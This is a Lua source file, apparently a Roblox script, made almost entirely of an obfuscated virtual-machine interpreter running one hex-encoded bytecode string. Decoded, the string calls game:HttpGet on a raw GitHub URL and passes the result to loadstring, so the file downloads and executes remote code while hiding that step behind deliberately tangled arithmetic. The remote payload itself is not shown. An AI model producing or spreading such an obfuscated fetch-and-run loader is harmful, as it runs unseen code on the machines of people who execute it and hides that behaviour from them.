--[[
    ,ad8888ba,                                      88               88  
   d8"'    `"8b                ,d       ,d          88               88  
  d8'                          88       88          88               88  
  88              ,adPPYba,  MM88MMM  MM88MMM       88   ,adPPYba,   88  
  88             a8"     "8a   88       88          88  a8"     "8a  88  
  Y8,            8b       d8   88       88          88  8b       d8  88  
   Y8a.    .a8P  "8a,   ,a8"   88,      88,    888  88  "8a,   ,a8"  88  
    `"Y8888Y"'    `"YbbdP"'    "Y888    "Y888  888  88   `"YbbdP"'   88                                                                                                                                                       
]]-- 

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v87=0;local v88;while true do if (v87==0) then v88=v2(v0(v30,16));if v19 then local v125=v5(v88,v19);v19=nil;return v125;else return v88;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v89=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-((879 -(282 + 595)) -1)) -(v32-(620 -(555 + 64)))) + 1)) ;return v89-(v89%((2569 -(1523 + 114)) -(857 + 74))) ;else local v90=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v90 + v90))>=v90) and (1 + 0)) or (0 + 0) ;end end local function v21() local v34=(117 -(32 + 85)) + 0 ;local v35;while true do if (v34==((1 + 0) -0)) then return v35;end if (v34==(1065 -(16 + 52 + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -(226 + 1044)) ;v34=4 -3 ;end end end local function v22() local v36=957 -(655 + 237 + 65) ;local v37;local v38;while true do if (v36==(2 -1)) then return (v38 * 256) + v37 ;end if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + ((7 -4) -1) );v18=v18 + (352 -(87 + 263)) ;v36=181 -(67 + 113) ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (15 -11) ;return (v42 * (16778168 -(584 + 218 + 150))) + (v41 * (176444 -110908)) + (v40 * (464 -208)) + v39 ;end local function v24() local v43=v23();local v44=v23();local v45=1 -0 ;local v46=(v20(v44,998 -(915 + 82) ,450 -(44 + 386) ) * ((5 -(1426 -(630 + 793)))^(19 + 13))) + v43 ;local v47=v20(v44,27 -6 ,1218 -(1069 + 118) );local v48=((v20(v44,11 + 21 )==(2 -1)) and  -(1 -(0 -0))) or (1 + 0) ;if (v47==(0 -0)) then if (v46==(0 -0)) then return v48 * 0 ;else local v111=0 + 0 ;while true do if (v111==(791 -(368 + 423))) then v47=860 -(814 + 45) ;v45=(0 -0) -0 ;break;end end end elseif (v47==(111 + 1936)) then return ((v46==(18 -(10 + 8))) and (v48 * (1/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(1465 -(416 + 26)) ) * (v45 + (v46/(((3 + 3) -(13 -9))^(23 + 29)))) ;end local function v25(v49) local v50;if  not v49 then local v91=1747 -(760 + 9 + 978) ;while true do if (v91==((1502 + 411) -(1789 + 124))) then v49=v23();if (v49==(766 -(745 + 21))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;local v51={};for v67=3 -(1057 -(87 + 968)) , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99) local v92=(function() return 1559 -(120 + 1439) ;end)();local v93=(function() return;end)();local v95=(function() return;end)();while true do if (v92~=0) then else local v116=(function() return 1784 -(599 + 1185) ;end)();local v117=(function() return;end)();while true do if (v116~=(0 + 0)) then else v117=(function() return 0;end)();while true do if (v117==(1 + 0)) then v92=(function() return  #"]";end)();break;end if (v117==0) then v93=(function() return v94();end)();v95=(function() return nil;end)();v117=(function() return 1;end)();end end break;end end end if (v92~= #"[") then else if (v93== #"{") then v95=(function() return v94()~=(574 -(507 + 67)) ;end)();elseif (v93==2) then v95=(function() return v96();end)();elseif (v93~= #"19(") then else v95=(function() return v97();end)();end v98[v99]=(function() return v95;end)();break;end end return v92,v93,v94,v95,v96,v97,v98,v99;end;end)();local v53=(function() return function(v100,v101,v102) local v103=(function() return 0 -0 ;end)();while true do if ((1749 -(1013 + 736))==v103) then local v119=(function() return 0 + 0 ;end)();local v120=(function() return;end)();while true do if (v119==(0 -0)) then v120=(function() return 1636 -(1373 + 263) ;end)();while true do if (v120~=(1000 -(451 + 549))) then else local v154=(function() return 0 + 0 ;end)();while true do if (v154==0) then v100[v101-#"," ]=(function() return v102();end)();return v100,v101,v102;end end end end break;end end end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"~",v58 do FlatIdent_8F047,Type,v21,Cons,v24,v25,v59,v69=(function() return v52(FlatIdent_8F047,Type,v21,Cons,v24,v25,v59,v69);end)();end v57[ #"xxx"]=(function() return v21();end)();for v70= #":",v23() do local v71=(function() return v21();end)();if (v20(v71, #"[", #"~")~=0) then else local v107=(function() return 0;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();while true do if (v107==(0 -0)) then local v121=(function() return 0 -0 ;end)();while true do if (v121==(867 -(550 + 317))) then v108=(function() return v20(v71,2 -0 , #"19(");end)();v109=(function() return v20(v71, #".dev",8 -2 );end)();v121=(function() return 1;end)();end if (v121==(2 -1)) then v107=(function() return 286 -(134 + 151) ;end)();break;end end end if (3==v107) then if (v20(v109, #"91(", #"-19")~= #".") then else v110[ #"?id="]=(function() return v59[v110[ #"xnxx"]];end)();end v54[v70]=(function() return v110;end)();break;end if (v107==2) then if (v20(v109, #"/", #"}")== #">") then v110[2]=(function() return v59[v110[2]];end)();end if (v20(v109,2 -0 ,1667 -(970 + 695) )~= #"\\") then else v110[ #"91("]=(function() return v59[v110[ #"asd"]];end)();end v107=(function() return 3;end)();end if (v107~=1) then else local v123=(function() return 0 -0 ;end)();local v124=(function() return;end)();while true do if (v123==(0 + 0)) then v124=(function() return 1990 -(582 + 1408) ;end)();while true do if (v124==(561 -(306 + 254))) then v107=(function() return 6 -4 ;end)();break;end if ((0 -0)==v124) then v110=(function() return {v22(),v22(),nil,nil};end)();if (v108==(1824 -(1195 + 629))) then local v170=(function() return 0;end)();local v171=(function() return;end)();while true do if ((0 -0)==v170) then v171=(function() return 0;end)();while true do if (v171~=0) then else v110[ #"-19"]=(function() return v22();end)();v110[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v108== #":") then v110[ #"asd"]=(function() return v23();end)();elseif (v108==(243 -(187 + 54))) then v110[ #"xnx"]=(function() return v23() -((2 + 0)^16) ;end)();elseif (v108== #"91(") then local v180=(function() return 780 -(162 + 618) ;end)();local v181=(function() return;end)();while true do if ((0 + 0)~=v180) then else v181=(function() return 0;end)();while true do if ((603 -(268 + 335))==v181) then v110[ #"91("]=(function() return v23() -((292 -(60 + 230))^(11 + 5)) ;end)();v110[ #"0836"]=(function() return v22();end)();break;end end break;end end end v124=(function() return 1 + 0 ;end)();end end break;end end end end end end for v72= #".",v23() do v55,v72,v28=(function() return v53(v55,v72,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[1 -0 ];local v65=v61[1458 -(282 + 1174) ];local v66=v61[3];return function(...) local v73=v64;local v74=v65;local v75=v66;local v76=v27;local v77=812 -(569 + 242) ;local v78= -(2 -1);local v79={};local v80={...};local v81=v12("#",...) -1 ;local v82={};local v83={};for v104=0 + 0 + 0 + 0 ,v81 do if (v104>=v75) then v79[v104-v75 ]=v80[v104 + (1025 -(706 + 318)) ];else v83[v104]=v80[v104 + (1252 -(721 + 530)) ];end end local v84=(v81-v75) + (1272 -(945 + 326)) ;local v85;local v86;while true do v85=v73[v77];v86=v85[2 -1 ];if ((v86<=(8 + 0)) or (1869==2009)) then if (v86<=(703 -(271 + 155 + 274))) then if ((v86<=(1 + 0)) or (3546<2322)) then if (v86==(1500 -(1408 + 92))) then v83[v85[1088 -((1214 -753) + 625) ]]();else local v129=v85[2];local v130=v83[v85[1291 -(993 + 295) ]];v83[v129 + 1 + (0 -0) ]=v130;v83[v129]=v130[v85[1175 -((1969 -(1126 + 425)) + 753) ]];end elseif (v86>(1 + 1)) then local v134=v85[(406 -(118 + 287)) + 1 ];local v135,v136=v76(v83[v134](v13(v83,v134 + 1 + 0 ,v85[11 -8 ])));v78=(v136 + v134) -(1 + 0) ;local v137=529 -(406 + 123) ;for v155=v134,v78 do v137=v137 + (1770 -(1749 + 20)) ;v83[v155]=v135[v137];end else do return;end end elseif ((v86<=(2 + 3)) or (2082==4773)) then if ((3244>1055) and (v86==4)) then v83[v85[2]]={};else v83[v85[1324 -(1249 + 73) ]]();end elseif (v86<=(3 + 3)) then v83[v85[1147 -(466 + 679) ]]=v63[v85[3]];elseif ((v86==(16 -9)) or (3313<=1778)) then local v158=v85[2];v83[v158]=v83[v158](v13(v83,v158 + (2 -1) ,v78));else local v160=v85[1902 -(106 + 1794) ];local v161=v83[v85[1 + 2 ]];v83[v160 + 1 + 0 ]=v161;v83[v160]=v161[v85[4]];end elseif (v86<=(35 -23)) then if (v86<=((1148 -(118 + 1003)) -17)) then if (v86==(123 -(4 + 110))) then do return;end else v83[v85[(1714 -1128) -(57 + 527) ]]=v85[(1807 -(142 + 235)) -(41 + 1386) ];end elseif ((v86>(114 -(17 + 86))) or (1421>=2104)) then v83[v85[2 + 0 ]]=v85[6 -3 ]~=(0 -(0 -0)) ;else local v144=v85[2];v83[v144]=v83[v144](v13(v83,v144 + (167 -(27 + 95 + (1021 -(553 + 424)))) ,v78));end elseif (v86<=14) then if (v86==(22 -(16 -7))) then local v146=0 -0 ;local v147;local v148;local v149;local v150;while true do if ((1812<=3249) and ((0 + 0)==v146)) then v147=v85[1 + 1 + 0 ];v148,v149=v76(v83[v147](v13(v83,v147 + 1 + 0 ,v85[5 -(2 + 0) ])));v146=66 -(30 + 35) ;end if (v146==1) then v78=(v149 + v147) -(1 + 0) ;v150=1257 -(1043 + 91 + 123) ;v146=7 -5 ;end if (v146==((694 + 520) -((699 -376) + 889))) then for v172=v147,v78 do local v173=0 -0 ;while true do if ((1623<=1957) and (v173==(580 -(361 + 219)))) then v150=v150 + (321 -(53 + 267)) ;v83[v172]=v148[v150];break;end end end break;end end else v83[v85[1 + 1 ]]=v63[v85[416 -(15 + 398) ]];end elseif (v86<=(997 -(18 + 964))) then v83[v85[7 -5 ]]=v85[2 + 1 ]~=(0 + 0) ;elseif ((4412==4412) and (v86>(866 -(20 + 830)))) then v83[v85[2 + 0 ]]=v85[129 -(116 + 10) ];else v83[v85[1 + 1 ]]={};end v77=v77 + (739 -(542 + 196)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403673Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F3132372Q3534383431373337353836323837362F2Q6A2F726566732F68656164732F6D61696E2F50726F7465637465645F323033343933393733393132352Q37362E747874000A4Q00107Q00120E000100013Q00120E000200023Q002008000200020003001211000400044Q000C000500014Q0003000200054Q000700013Q00024Q0001000100012Q00093Q00017Q00",v9(),...);
